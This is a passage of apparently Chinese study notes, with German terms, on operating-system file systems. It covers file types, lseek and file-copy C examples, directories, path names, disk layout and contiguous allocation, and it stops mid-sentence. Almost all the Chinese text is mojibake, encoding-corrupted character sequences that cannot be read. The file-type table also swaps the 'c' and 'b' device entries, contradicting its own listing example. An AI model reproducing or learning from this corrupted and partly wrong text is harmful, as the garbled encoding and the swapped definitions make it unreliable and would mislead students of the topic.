ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬ä¼šå¯¹æ–‡ä»¶ç³»ç»Ÿæœ‰ç€ä»¥ä¸‹è¦æ±‚ï¼š æä¾›å­˜å‚¨ç©ºé—´ä»¥å®¹çº³å¤§é‡æ•°æ®ï¼ˆSpeicherplatz fÃ¼r (sehr) groÃŸe Datenmengen bereitstellenï¼‰ é˜²æ­¢æ•°æ®ä¸¢å¤±ï¼ˆDatenverlust vermeidenï¼‰ æ”¯æŒå¹¶å‘è®¿é—®æ•°æ®ï¼ˆNebenlÃ¤ufigen Zugriff auf Daten ermÃ¶glichenï¼‰ å¤šä¸ªè¿›ç¨‹åº”èƒ½å¤ŸåŒæ—¶è®¿é—®æ•°æ®ã€‚ æ–‡ä»¶ç³»ç»Ÿçš„åŸºæœ¬ä½œç”¨æ˜¯å°†ç¡¬ç›˜ä¸Šçš„åŸå§‹æ•°æ®å—ç»„ç»‡æˆç»“æ„è‰¯å¥½çš„æ–‡ä»¶ï¼Œä½¿å¾—ç”¨æˆ·å’Œç¨‹åºå¯ä»¥æ–¹ä¾¿åœ°å­˜å–æ•°æ®ã€‚ å…·ä½“çš„ä»»åŠ¡åŒ…æ‹¬ï¼š å¯ä»¥æè¿°æ–‡ä»¶çš„æ•°æ®ç»“æ„ï¼ˆDatenstrukturen zur Beschreibung von Dateienï¼‰ å®ç°æ–‡ä»¶ï¼ˆImplementierung der Dateienï¼‰ å‘½åï¼ˆBenennungï¼‰ å…è®¸è®¿é—®æ–‡ä»¶ï¼ˆZugriffe auf Dateien ermÃ¶glichenï¼‰ é˜²æ­¢æœªæˆæƒè®¿é—®ï¼ˆSchutz vor unberechtigten Zugriffenï¼‰ å¸¸è§çš„æ–‡ä»¶ç³»ç»Ÿæœ‰ï¼š FAT-16/32 (DOS) è€å¼çš„å¾®è½¯æ–‡ä»¶ç³»ç»Ÿ NTFS (Windows NT) å¾®è½¯å½“å‰ä¸»æµçš„æ–‡ä»¶ç³»ç»Ÿ Ext2/3/4 (Linux) Linux ç³»ç»Ÿä¸­å¹¿æ³›ä½¿ç”¨çš„æ–‡ä»¶ç³»ç»Ÿç³»åˆ—ï¼ˆExt4æ˜¯ç›®å‰ä¸»æµï¼‰ ç¡¬ç›˜ç¡¬ç›˜ä½œä¸ºé•¿æœŸå­˜å‚¨çš„åª’ä»‹ï¼Œå¯ä»¥è¢«çœ‹ä½œæ˜¯ä¸€ä¸²å›ºå®šå¤§å°çš„çº¿æ€§æ•°æ®å—åºåˆ—ï¼ˆ eine lineare Sequenz von BlÃ¶cken fester GrÃ¶ÃŸe ï¼‰ã€‚è¿™é‡Œçš„å—ï¼ˆBlockï¼‰å°±æ˜¯ç¡¬ç›˜è¯»å†™çš„åŸºæœ¬å•ä½ï¼ˆEinheitï¼‰ã€‚è¿™é‡Œçš„å—çš„å¤§å°æ˜¯ç”±æ“ä½œç³»ç»Ÿå†³å®šçš„ï¼Œå’Œç¡¬ç›˜çš„sectoræ²¡æœ‰ç›´æ¥çš„å¤§å°å…³ç³»ã€‚ è€Œä¸ºäº†æ›´å¥½çš„ç®¡ç†ç¡¬ç›˜çš„å­˜å‚¨ç©ºé—´ï¼Œæˆ‘ä»¬éœ€è¦æ“ä½œç³»ç»Ÿå¯¹ç¡¬ç›˜å±æ€§è¿›è¡Œè™šæ‹ŸåŒ–ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„æ–‡ä»¶æ¦‚å¿µï¼ˆDatei-Konzeptï¼‰ï¼š æ–‡ä»¶æ˜¯é€»è¾‘ä¸Šçš„ç®¡ç†å•å…ƒã€‚ï¼ˆDateien sind logische Verwaltungs-Einheitenï¼‰ æ–‡ä»¶å¯ä»¥æŒä¹…åœ°å­˜å‚¨ä»»æ„ä¿¡æ¯ã€‚ï¼ˆDateien speichern beliebige Informationen persistent (dauerhaft)ï¼‰ æ–‡ä»¶ç³»ç»Ÿå¯¹å—çš„å­˜å‚¨ä½ç½®ã€ç©ºé—²çŠ¶æ€ç­‰è¿›è¡Œäº†æŠ½è±¡å¤„ç†ã€‚ï¼ˆDatei abstrahiert davon, wo die BlÃ¶cke gespeichert sind, welche BlÃ¶cke frei sind usw.ï¼‰ è¿›ç¨‹å¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨æ¥åˆ›å»ºã€å†™å…¥ã€è¯»å–å’Œåˆ é™¤æ–‡ä»¶ã€‚ï¼ˆerstellen, schreiben, lesen, lÃ¶schenï¼‰ æ–‡ä»¶ä¸ä»…è¢«ç”¨æˆ·ç¨‹åºä½¿ç”¨ï¼Œä¹Ÿè¢«ç³»ç»Ÿè½¯ä»¶ä½¿ç”¨ã€‚ï¼ˆ Dateien werden sowohl von Benutzerprogrammen als auch von der Systemsoftware verwendetï¼‰ æ–‡ä»¶ ï¼ˆDateienï¼‰æˆ‘ä»¬é¦–å…ˆé€šè¿‡ç”¨æˆ·è§†è§’æ¥äº†è§£ä¸€ä¸‹æ–‡ä»¶ç³»ç»Ÿï¼šå°±ä»æˆ‘ä»¬æ—¥å¸¸æ¥è§¦çš„æ–‡ä»¶å¼€å§‹ã€‚ æ–‡ä»¶ä½œä¸ºè¢«ç®¡ç†çš„å•ä½ï¼ˆzu verwaltende Einheitenï¼‰ï¼Œå¯ä»¥è¢«ä¸åŒçš„è¿›ç¨‹ä½¿ç”¨ã€‚æ‰€æœ‰æ–‡ä»¶éƒ½å¿…é¡»æœ‰åå­—ï¼Œæ²¡æœ‰ç»Ÿä¸€çš„å‘½åè§„åˆ™ã€‚ä¸€èˆ¬æƒ…å†µä¸‹åå­—ä¼šç”±2éƒ¨åˆ†ç»„æˆï¼šåå­—ï¼ˆNameï¼‰å’Œæ‰©å±•åï¼ˆExtensionï¼‰ã€‚è€Œæœ‰äº›ç³»ç»Ÿï¼ˆæ¯”å¦‚è¯´Windowsï¼‰ä¼šè§£ææ‰©å±•åï¼Œæœ‰äº›åˆ™ä¸ä¼šï¼ˆæ¯”å¦‚UNIXï¼‰ã€‚ æ–‡ä»¶å¯ä»¥é‡‡ç”¨ä¸‰ç§ä¸åŒçš„ç»“æ„æ–¹å¼ï¼š éç»“æ„åŒ–ï¼ˆUnstrukturiertï¼‰ æ“ä½œç³»ç»ŸåªæŠŠæ–‡ä»¶å½“ä½œä¸€ä¸²å­—èŠ‚ï¼ˆeine Folge von Bytesï¼‰ï¼ˆé€‚ç”¨äº UNIX å’Œ Windowsï¼‰æ¥çœ‹å¾…ï¼Œå®ƒä¸ä¼šå°è¯•å»ç†è§£æ–‡ä»¶é‡Œé¢åˆ°åº•æ˜¯ä»€ä¹ˆå†…å®¹ã€‚ ä¼˜ç‚¹ï¼šç”¨æˆ·ç¨‹åºæœ‰æ›´å¤§çš„çµæ´»æ€§ å›ºå®šå¤§å°è®°å½•çš„åºåˆ—ï¼ˆSequenzen von EintrÃ¤gen fester GrÃ¶ÃŸeï¼‰ æ¯æ¡è®°å½•æœ‰å›ºå®šçš„å¤§å°å’Œç»“æ„ï¼Œæ¯”å¦‚æ¯è¡Œåªèƒ½å†™ 80 ä¸ªå­—ç¬¦ã€‚ç°ä»£çš„æ“ä½œç³»ç»Ÿå·²ç»å¾ˆå°‘ä½¿ç”¨è¿™ç§æ–¹å¼äº†ã€‚ å…·æœ‰ä¸åŒå¤§å°è®°å½•çš„æ ‘ç»“æ„ï¼ˆEin Baum mit EintrÃ¤gen unterschiedlicher GrÃ¶ÃŸeï¼‰ æ¯æ¡è®°å½•éƒ½æœ‰ä¸€ä¸ªKeyï¼Œè¿™äº›Keyéƒ½æ˜¯æœ‰åºå­˜å‚¨çš„ã€‚é€‚åˆåœ¨å¤§å‹è®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿï¼ˆGroÃŸrechner-BS ï¼‰ä¸­ç”¨äºå¤„ç†å¤§é‡æ•°æ®ã€‚ æ–‡ä»¶ç±»å‹ï¼ˆDateitypenï¼‰æ“ä½œç³»ç»Ÿæ”¯æŒå¤šç§æ–‡ä»¶ç±»å‹ï¼š æ™®é€šæ–‡ä»¶ï¼ˆ Dateienï¼Œregular filesï¼‰ï¼š åŒ…å«ç”¨æˆ·æ•°æ®çš„æ–‡ä»¶ï¼Œæ¯”å¦‚è¯´ï¼š æ–‡æœ¬æ–‡ä»¶ï¼ˆText-Dateienï¼‰ï¼š Bestehen aus Zeilen, die durch carriage return ï¼ˆå›è½¦ç¬¦ï¼Œ\\rï¼‰und/oder linefeed Zeichenï¼ˆæ¢è¡Œç¬¦ï¼Œ\\nï¼‰ abgeschlossen sind. äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆBinÃ¤rdateienï¼‰ï¼šå…·æœ‰ç‰¹å®šæ ¼å¼ï¼Œæ¯”å¦‚è¯´å¯æ‰§è¡Œæ–‡ä»¶ã€å‹ç¼©åŒ…ç­‰ã€‚ ç›®å½•ï¼ˆVerzeichnisseï¼Œdirectoriesï¼‰ï¼š æ˜¯ç”¨äºç»„ç»‡å’Œç®¡ç†æ–‡ä»¶ç³»ç»Ÿä¸­ç»“æ„çš„ç³»ç»Ÿæ–‡ä»¶ã€‚ å—è®¾å¤‡æ–‡ä»¶ï¼ˆBlock Special Filesï¼‰ å­—ç¬¦è®¾å¤‡æ–‡ä»¶ï¼ˆCharacter Special Filesï¼‰ åœ¨linuxç§å¯ä»¥ç”¨ ls -l æ¥æŸ¥çœ‹æ–‡ä»¶ç±»å‹ï¼š ç¬¬ä¸€ä½å­—ç¬¦ æ–‡ä»¶ç±»å‹ - æ™®é€šæ–‡ä»¶ d ç›®å½• c å—è®¾å¤‡æ–‡ä»¶ b å­—ç¬¦è®¾å¤‡æ–‡ä»¶ ä¾‹å­ï¼š 1234drwxr-xr-x 2 user user 4096 Mar 26 test_folder-rw-r--r-- 1 user user 1234 Mar 26 notes.txtcrw-rw---- 1 root tty 4, 0 Mar 26 /dev/tty0brw-rw---- 1 root disk 8, 0 Mar 26 /dev/sda å¯æ‰§è¡Œæ–‡ä»¶çš„ç»“æ„ï¼š å‹ç¼©æ–‡ä»¶çš„ç»“æ„ï¼š æ–‡ä»¶è®¿é—®æ–¹å¼ï¼ˆDateizugriffï¼‰é¡ºåºè®¿é—®ï¼ˆSequential accessï¼‰ï¼ˆåªæœ‰åœ¨å¾ˆè€çš„æ“ä½œç³»ç»Ÿé‡Œæ‰ä¼šå‡ºç°äº†ã€‚ï¼‰ åœ¨è¿™ç§è®¿é—®ä¸‹ï¼Œè¿›ç¨‹éœ€è¦æŒ‰é¡ºåºè¯»å–æ–‡ä»¶ä¸­çš„å­—èŠ‚ï¼ˆæˆ–è®°å½•ï¼‰ï¼Œæ–‡ä»¶çš„éƒ¨åˆ†å†…å®¹ä¸èƒ½è·³è¿‡ï¼Œé€‚åˆç£å¸¦ç±»å­˜å‚¨è®¾å¤‡ã€‚ æ¯”å¦‚è¯´è¯»ä¸€æœ¬ä¹¦çš„æ—¶å€™åªèƒ½ä¸€é¡µä¸€é¡µå¾€åç¿»ï¼Œä¸èƒ½ç›´æ¥è·³åˆ°ç¬¬50é¡µã€‚ éšæœºè®¿é—®ï¼ˆRandom-accessï¼‰è¿›ç¨‹å¯ä»¥æŒ‰ä»»æ„é¡ºåºè¯»å–æ–‡ä»¶ä¸­çš„å­—èŠ‚ï¼ˆæˆ–è®°å½•ï¼‰ï¼Œåœ¨æ•°æ®åº“ç³»ç»Ÿä¸­å°¤å…¶é‡è¦ï¼ˆå¿«é€Ÿå®šä½è®°å½•ï¼‰ã€‚ UNIX ç³»ç»Ÿä¸­ï¼Œlseek ç³»ç»Ÿè°ƒç”¨å¯ä»¥æ”¹å˜â€œè¯»å†™æŒ‡é’ˆâ€ä½ç½®ï¼š 1lseek(fd, 1024, SEEK_SET); fdæ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œ1024æ˜¯åç§»é‡ï¼ˆoffsetï¼‰ï¼ˆå•ä½æ˜¯Byteï¼‰ï¼ŒSEEK_SET åˆ™æ˜¯å®šä½æ–¹å¼ï¼Œæœ‰å‡ ç§é€‰æ‹©ï¼š å¸¸é‡å å«ä¹‰ SEEK_SET ä»æ–‡ä»¶å¼€å¤´å¼€å§‹åç§» offset å­—èŠ‚ SEEK_CUR ä»å½“å‰ä½ç½®å¼€å§‹åç§» SEEK_END ä»æ–‡ä»¶æœ«å°¾å¼€å§‹åç§» ï¼ˆoffsetéœ€è¦è°ƒæ•´ä¸ºè´Ÿæ•°ï¼‰ ä¾‹å­ï¼š 12345678910111213141516171819202122232425262728293031#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(int argc, char *argv[]) &#123; int fd; // æ–‡ä»¶æè¿°ç¬¦ char buf[128]; // ç¼“å†²åŒºï¼Œç”¨äºè¯»å–128å­—èŠ‚å†…å®¹ // æ‰“å¼€æ–‡ä»¶ &quot;myfile.txt&quot;ï¼Œåªè¯»æ–¹å¼ fd = open(&quot;myfile.txt&quot;, O_RDONLY); if (fd &lt; 0) // å¦‚æœæ‰“å¼€å¤±è´¥ï¼Œé€€å‡º return EXIT_FAILURE; // å°†æ–‡ä»¶è¯»å†™ä½ç½®ç§»åŠ¨åˆ°ä»æ–‡ä»¶å¤´å¼€å§‹çš„ç¬¬1024ä¸ªå­—èŠ‚ if (lseek(fd, 1024, SEEK_SET) &lt; 0) return EXIT_FAILURE; // ä»å½“å‰ä½ç½®è¯»å–128å­—èŠ‚åˆ°ç¼“å†²åŒºbufä¸­ if (read(fd, buf, 128) &lt; 0) return EXIT_FAILURE; // æ‰“å°è¯»å–åˆ°çš„å†…å®¹ printf(&quot;%s\\n&quot;, buf); // å…³é—­æ–‡ä»¶ close(fd); // æ­£å¸¸é€€å‡º return EXIT_SUCCESS;&#125; æ–‡ä»¶å±æ€§ï¼ˆDateiattributeï¼‰æ¯ä»½æ–‡ä»¶é™¤äº†æ–‡ä»¶åå’Œæ–‡ä»¶å†…å®¹å¤–è¿˜ä¼šé™„å¸¦ä¸€äº›å…¶ä»–ä¿¡æ¯ï¼šå…ƒä¿¡æ¯ï¼ˆMeta-Informationenï¼‰ã€‚ å…ƒä¿¡æ¯åŒ…å«ï¼š å¯¹æ–‡ä»¶çš„è®¿é—®æƒé™ æ¯”å¦‚è¯´åœ¨UNIXé‡Œï¼Œæƒé™èµ‹äºˆå¯¹è±¡åˆ†æˆ æ‰€æœ‰è€…ï¼ˆOwnerï¼‰ã€ç”¨æˆ·ç»„ï¼ˆGroupï¼‰ã€æ‰€æœ‰äººï¼ˆAllï¼‰ã€‚è€Œæƒé™ç§ç±»æœ‰rï¼ˆè¯»å–ï¼‰ã€wï¼ˆå†™å…¥ï¼‰ã€xï¼ˆæ‰§è¡Œï¼‰ ä¾‹å­ï¼š 1-rwxr--r-- æ ‡å¿—ä½ï¼ˆflagsï¼‰ï¼šæ§åˆ¶æ–‡ä»¶çš„æŸäº›å±æ€§ æ¯”å¦‚è¯´å¯ä»¥å°†æ–‡ä»¶è®¾ç½®ä¸ºéšè—ã€æ ‡è¯†ä¸ºäºŒè¿›åˆ¶æˆ–å½’æ¡£æ–‡ä»¶ç­‰ã€‚ è¯¦è§ï¼š æ–‡ä»¶æ“ä½œï¼ˆDatei-Operationenï¼‰å¸¸è§çš„æ–‡ä»¶æ“ä½œéƒ½æ˜¯é€šè¿‡ç³»ç»Ÿè°ƒç”¨æä¾›çš„ï¼š åˆ›å»ºå’Œåˆ é™¤æ–‡ä»¶ open ï¼ˆæ‰“å¼€ï¼‰: åœ¨è®¿é—®ä¸€ä¸ªæ–‡ä»¶ä¹‹å‰ï¼Œå¿…é¡»å…ˆæ‰“å¼€å®ƒã€‚è¿™ä¼šè®©æ“ä½œç³»ç»ŸæŠŠæ–‡ä»¶å±æ€§å’Œå…¶ä»–ä¿¡æ¯åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œæ–¹ä¾¿å¿«é€Ÿå¤„ç†ã€‚open() ç³»ç»Ÿè°ƒç”¨è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptorï¼‰ï¼Œè¿™æ˜¯ä¸€ä¸ªå°çš„æ•´æ•°ï¼Œç”¨æ¥æ ‡è¯†è¿™ä¸ªæ‰“å¼€çš„æ–‡ä»¶ã€‚ unlink ï¼ˆåˆ é™¤ï¼‰ åç»­å¯¹æ–‡ä»¶çš„è®¿é—®ï¼ˆé€šè¿‡æ–‡ä»¶æè¿°ç¬¦ï¼‰ close ï¼ˆå…³é—­ï¼‰ ä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦æ¥å…³é—­æ–‡ä»¶ï¼Œé‡Šæ”¾å†…éƒ¨æ•°æ®ç»“æ„èµ„æºã€‚ read ï¼ˆè¯»å–ï¼‰ æŒ‡å®šè¦è¯»å–çš„æ•°æ®ä»¥åŠä¸€ä¸ªç¼“å†²åŒºï¼ˆbufferï¼‰ï¼Œè¯»å–çš„å†…å®¹å°†è¢«æ”¾å…¥è¯¥ç¼“å†²åŒºã€‚ ä¸€å®šè¦æå‰åˆ›å»ºä¸€ä¸ªç¼“å†²åŒºï¼ write ï¼ˆå†™å…¥ï¼‰ å°†æ•°æ®å†™å…¥åˆ°å½“å‰æ–‡ä»¶æŒ‡é’ˆæ‰€åœ¨çš„ä½ç½®ï¼Œæ³¨æ„åŸæœ‰æ•°æ®å¯èƒ½ä¼šè¢«è¦†ç›–ã€‚ seek ï¼ˆå®šä½ï¼‰ ç§»åŠ¨æ–‡ä»¶æŒ‡é’ˆåˆ°æŒ‡å®šä½ç½®ï¼ˆä¹‹åå¯ä»¥ä»è¯¥ä½ç½®è¯»å–æˆ–å†™å…¥ï¼‰ã€‚ï¼ˆè§ä¸Šé¢éšæœºè®¿é—®é‚£é‡Œçš„ä¾‹å­ï¼‰ ä»£ç ä¾‹å­ï¼š 12345678910111213141516171819202122232425262728293031323334#include &lt;stdlib.h&gt; #include &lt;fcntl.h&gt; // åŒ…å« open() çš„ç›¸å…³å®šä¹‰å’Œæ–‡ä»¶æƒé™#include &lt;unistd.h&gt; // åŒ…å« read(), write(), close() çš„å£°æ˜#define BUF_SIZE 4096 // å®šä¹‰ç¼“å†²åŒºçš„å¤§å°int main (int argc, char *argv[]) &#123; int fd_in, fd_out, count; // 2ä¸ªæ–‡ä»¶æè¿°ç¬¦ å’Œ è¯»å†™å­—èŠ‚æ•°è®¡æ•°å™¨ char buf[BUF_SIZE]; // ç¼“å†²åŒº // å¦‚æœå‚æ•°ä¸ªæ•°ä¸ä¸º3ï¼ˆç¨‹åºå + è¾“å…¥æ–‡ä»¶ + è¾“å‡ºæ–‡ä»¶ï¼‰ï¼Œåˆ™å¤±è´¥é€€å‡º if (argc != 3) return EXIT_FAILURE; // æ‰“å¼€è¾“å…¥æ–‡ä»¶ï¼Œåªè¯»æ¨¡å¼ï¼ˆO_RDONLYï¼‰ if ((fd_in = open(argv[1], O_RDONLY)) == -1) return EXIT_FAILURE; // æ‰“å¼€æˆ–åˆ›å»ºè¾“å‡ºæ–‡ä»¶ï¼Œåªå†™æ¨¡å¼ï¼Œæƒé™ä¸ºç”¨æˆ·å¯è¯»å†™ï¼ˆrw- --- ---ï¼‰ if ((fd_out = open(argv[2], O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR)) == -1) return EXIT_FAILURE; // è¯»å–è¾“å…¥æ–‡ä»¶çš„å†…å®¹å¹¶å†™å…¥åˆ°è¾“å‡ºæ–‡ä»¶ä¸­ï¼Œç›´åˆ°è¯»å®Œ while ((count = read(fd_in, buf, BUF_SIZE)) &gt; 0) &#123; // å¦‚æœå†™å…¥å¤±è´¥æˆ–æœªèƒ½å†™å…¥å…¨éƒ¨å†…å®¹ï¼Œè¿”å›å¤±è´¥ if (write(fd_out, buf, count) &lt;= 0) return EXIT_FAILURE; &#125; // å…³é—­ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ close(fd_in); close(fd_out); return EXIT_SUCCESS; // æˆåŠŸç»“æŸç¨‹åº&#125; ç›®å½•ï¼ˆVerzeichnisseï¼‰æ–‡ä»¶ç³»ç»Ÿé€šè¿‡ç›®å½•æ¥ç»„ç»‡æ–‡ä»¶ã€‚è€Œç›®å½•æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ï¼Œå®ƒåªåŒ…å«ç®¡ç†ä¿¡æ¯ï¼ˆæ¯”å¦‚ï¼šæ–‡ä»¶åã€è·¯å¾„ã€æŒ‡é’ˆç­‰ï¼‰ã€‚ç›®å½•ä½¿æ–‡ä»¶ç³»ç»Ÿæ”¯æŒå±‚çº§ç®¡ç†ï¼ˆhierarchische Verwaltungï¼‰ï¼Œè®©ç»“æ„æ›´æ¸…æ™°ã€æŸ¥æ‰¾æ›´é«˜æ•ˆã€‚ ä¸‹é¢è¿™ä¸¤ç§æ˜¯æ¯”è¾ƒå¸¸è§çš„ç›®å½•ç»“æ„ï¼š 1. å•å±‚ç›®å½•ç»“æ„ï¼ˆSingle-Level Verzeichnisstrukturenï¼‰ åœ¨è¿™ç§ç»“æ„é‡Œåªæœ‰ä¸€ä¸ªç›®å½•ï¼ˆæ ¹ç›®å½•ï¼Œroot directoryï¼‰ç”¨äºå­˜æ”¾æ‰€æœ‰æ–‡ä»¶ã€‚ç›®å‰ä¾ç„¶åœ¨ä¸€äº›åµŒå…¥å¼ç³»ç»Ÿä¸­ä½¿ç”¨ã€‚ ä¼˜ç‚¹ï¼šæ–‡ä»¶å¯ä»¥å¾ˆå¿«è¢«æ‰¾åˆ°ï¼ˆå› ä¸ºéƒ½åœ¨åŒä¸€ä¸ªåœ°æ–¹ï¼‰ã€‚ ç¼ºç‚¹ï¼šæ‰€æœ‰ç”¨æˆ·å…±äº«åŒä¸€ä¸ªç›®å½•ï¼Œæ²¡æœ‰åˆ†å±‚ç»“æ„ã€‚ 2. å±‚æ¬¡å‹ç›®å½•ç»“æ„ï¼ˆHierarchische Verzeichnisstrukturenï¼‰ è¿™ç§ä¼šå°†ç›¸å…³çš„æ–‡ä»¶ä»¥åˆ†å±‚æ–¹å¼ç»„ç»‡åœ¨ç›®å½•ä¸­ï¼Œæ¯ä¸ªç”¨æˆ·æ‹¥æœ‰è‡ªå·±ä¸“å±çš„ä¸»ç›®å½•ï¼Œå¹¶å¯åŒ…å«å­ç›®å½•ã€‚ è·¯å¾„åï¼ˆPfadnamenï¼‰è·¯å¾„åæ˜¯ä¸ºäº†åœ¨æ ‘çŠ¶ç»“æ„çš„æ–‡ä»¶ç³»ç»Ÿä¸­ä¸ºæ–‡ä»¶å‘½åï¼Œä¸€èˆ¬åˆ†3ç§ï¼š 1. ç»å¯¹è·¯å¾„åï¼ˆAbsolute Pfadnamenï¼‰ è·¯å¾„ä»æ ¹ç›®å½•ï¼ˆRoot-Verzeichnisï¼‰å¼€å§‹ï¼Œä¸€ç›´åˆ°ç›®æ ‡æ–‡ä»¶ã€‚ æ³¨æ„ï¼šUNIX/Linux ä¸­ç”¨ / ï¼ŒWindows ä¸­ç”¨ \\ ã€‚ ä¾‹å­ï¼š 1/tum/git/gbs/uebungsbetrieb/ws18/09/c-files/mem.c 2. ç›¸å¯¹è·¯å¾„åï¼ˆRelative Pfadnamenï¼‰ è·¯å¾„æ˜¯ç›¸å¯¹äºå½“å‰å·¥ä½œç›®å½•ï¼ˆCurrent Working Directoryï¼‰è€Œè¨€çš„ã€‚ æ¯”å¦‚å½“å‰è·¯å¾„æ˜¯ 1/tum/git/gbs/uebungsbetrieb/ws18/09 çš„æ—¶å€™ï¼Œå°±å¯ä»¥è¿™æ ·å¼•ç”¨æ–‡ä»¶ï¼š123blatt09.pdfæˆ–è€…c-files/mem.c 3. ç‰¹æ®Šè·¯å¾„ . è¡¨ç¤ºå½“å‰ç›®å½•ï¼Œ.. è¡¨ç¤ºä¸Šä¸€çº§ç›®å½•ã€‚ ä¾‹å­ï¼š å‡è®¾å½“å‰è·¯å¾„æ˜¯ 1ws18/09/ å¯ä»¥ç”¨ 12cp ../08/gbsuebung.cls .# ä»å½“å‰ç›®å½•çš„ä¸Šä¸€çº§ç›®å½•ä¸­çš„ 08 å­ç›®å½•é‡Œï¼Œå¤åˆ¶ gbsuebung.cls æ–‡ä»¶åˆ°å½“å‰ç›®å½•ä¸­ æ–‡ä»¶ç³»ç»Ÿä»ç°åœ¨å¼€å§‹æˆ‘ä»¬ä»å®ç°è§’åº¦ï¼ˆImplementierungs-Sichtï¼‰æ¥äº†è§£æ–‡ä»¶ç³»ç»Ÿï¼šå®ƒå†…éƒ¨æ˜¯å¦‚ä½•å®ç°å„ç§åŠŸèƒ½çš„ã€‚ æ–‡ä»¶ç³»ç»Ÿå¸ƒå±€ï¼ˆDateisystem-Layoutï¼‰ç¡¬ç›˜ä¼šè¢«åˆ’åˆ†ä¸ºå¤šä¸ªåˆ†åŒºï¼ˆPartitionenï¼‰ï¼Œæ¯ä¸ªåˆ†åŒºå¯ä»¥ç‹¬ç«‹å­˜å‚¨ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå½¼æ­¤ä¹‹é—´äº’ä¸å½±å“ã€‚ ä½äº Sektor 0 çš„æ˜¯ä¸»å¼•å¯¼è®°å½•ï¼ˆMBRï¼ŒMaster Boot Recordï¼‰ã€‚é‡Œé¢å­˜å‚¨äº†ä¸€ä¸ªåˆ†åŒºè¡¨ï¼ˆPartitions-Tabelleï¼‰ï¼Œç”¨äºçºªå½•æ¯ä¸ªåˆ†åŒºçš„èµ·å§‹å’Œç»“æŸåœ°å€ã€‚ åœ¨å¯åŠ¨ç”µè„‘æ—¶ï¼ˆBootenï¼‰ï¼ŒBIOSï¼ˆæˆ–ç°ä»£çš„ UEFIï¼‰ä¼šè¯»å– MBRï¼Œæ‰§è¡Œ MBR ç¨‹åºï¼Œç„¶åæ ¹æ®åˆ†åŒºè¡¨ï¼ˆPartitions-Tabelleï¼‰å®šä½åˆ°æ´»åŠ¨åˆ†åŒºï¼ˆaktiven Partitionï¼‰ï¼Œè¯»å–å¹¶æ‰§è¡Œè¯¥åˆ†åŒºçš„ç¬¬ä¸€ä¸ªå— Boot Block ä¸­çš„ä»£ç ï¼Œå¼•å¯¼æ“ä½œç³»ç»ŸåŠ è½½ã€‚ æ¯ä¸ªåˆ†åŒºå†…éƒ¨çš„ç»“æ„ä¼šéšç€æ–‡ä»¶ç³»ç»Ÿçš„ä¸åŒè€Œå˜åŒ–ã€‚ ä¸Šé¢å›¾ç‰‡é‡Œå±•ç¤ºçš„æ˜¯UNIX/Linuxä¸­æ–‡ä»¶ç³»ç»Ÿçš„ä¾‹å­ï¼š è¶…çº§å—ï¼ˆSuperblockï¼‰ å­˜å‚¨å…³äºæ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„å…³é”®ä¿¡æ¯ï¼ŒåŒ…æ‹¬ Magic Numberï¼ˆè¯†åˆ«æ–‡ä»¶ç³»ç»Ÿç±»å‹çš„æ ‡è¯†ï¼‰, Anzahl der BlÃ¶cke, etc. ç©ºé—²å—ä¿¡æ¯ï¼ˆInformationen Ã¼ber freie BlÃ¶ckeï¼‰ ï¼ˆä¸Šä¸€ç« çš„å†…å®¹ï¼‰å¯ä»¥é€šè¿‡ä½å›¾ï¼ˆBitmapï¼‰æˆ–è€…æŒ‡é’ˆé“¾è¡¨ï¼ˆPointer Listï¼‰å®ç°ã€‚ æ–‡ä»¶æè¿°ç¬¦é›†åˆï¼ˆi-nodesï¼‰ æ–‡ä»¶å’Œç›®å½• æ–‡ä»¶çš„å­˜å‚¨ä¸å®ç°æ–¹å¼ï¼ˆImplementierung von Dateienï¼‰æ–‡ä»¶ç³»ç»Ÿç®¡ç†é‚£äº›ç”¨äºä¿å­˜æ–‡ä»¶å†…å®¹çš„ç£ç›˜å—ï¼ˆBlÃ¶ckeï¼‰ï¼Œä½†æ¯ä¸ªæ–‡ä»¶çš„æ•°æ®éƒ½è¢«åˆ†æˆå¤šä¸ªå—ï¼Œç³»ç»Ÿæ€ä¹ˆæ ·å¯ä»¥çŸ¥é“è¿™äº›å—åœ¨å“ªå„¿å‘¢ï¼Ÿ ä»¥ä¸‹æ˜¯ç®¡ç†æ–‡ä»¶å†…å®¹æ‰€ç”¨çš„ä¸‰ç§ä¸»è¦å®ç°æ–¹æ¡ˆï¼š è¿ç»­åˆ†é…ï¼ˆContiguous Allocationï¼‰æ–‡ä»¶è¢«è§†ä¸ºç¡¬ç›˜ä¸Šä¸€ä¸²è¿ç»­çš„å—ï¼Œä¹Ÿå°±æ˜¯è¯´æ–‡ä»¶çš„æ‰€æœ‰æ•°æ®å—åœ¨ç‰©ç†ç£ç›˜ä¸Šæ˜¯æŒ¨åœ¨ä¸€èµ·çš„ï¼ˆå¦‚ä¸‹å›¾ï¼‰ã€‚ ä¼˜ç‚¹ï¼š å®ç°ç®€å•ï¼ˆEinfache Implementierungï¼‰ è¯»å–æ€§èƒ½é«˜ï¼ˆLesen ist sehr performantï¼‰ ç”±äºæ•°æ®è¿ç»­ï¼Œåªéœ€ä¸€æ¬¡ç£å¤´å®šä½å°±å¯ä»¥ä¸€æ¬¡æ€§æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å®Œï¼Œéå¸¸é«˜æ•ˆã€‚ ç¼ºç‚¹ï¼š å¤–éƒ¨ç¢ç‰‡é—®é¢˜ï¼ˆExterne Fragmentierungï¼‰ æŒ‡éšç€æ–‡ä»¶çš„åˆ›å»ºä¸åˆ é™¤ï¼ˆä¹Ÿå°±æ˜¯å¤–éƒ¨åŸå› 